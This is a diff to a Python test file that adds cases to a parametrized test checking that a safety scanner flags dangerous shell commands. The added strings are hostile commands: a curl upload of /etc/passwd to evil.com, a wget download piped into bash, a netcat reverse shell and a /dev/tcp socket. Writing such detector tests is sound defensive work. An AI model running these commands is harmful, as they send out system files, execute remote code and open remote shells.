@@ -222,6 +222,11 @@ class TestSafetyChecks:
             ("git submodule update --recursive\n", "SEC-098"),
             ("chmod u+s /usr/bin/tool\n", "SEC-099"),
             ("shutdown -h now\n", "SEC-100"),
+            ("curl -F file=@/etc/passwd http://evil.com/up\n", "SEC-101"),
+            ("wget -qO- http://evil.com/x.sh | bash\n", "SEC-102"),
+            ("ssh-keygen -t rsa -f /tmp/key\n", "SEC-103"),
+            ("nc -e /bin/sh 192.168.1.1 4444\n", "SEC-104"),
+            ("exec 3<>/dev/tcp/192.168.1.1/4444\n", "SEC-105"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
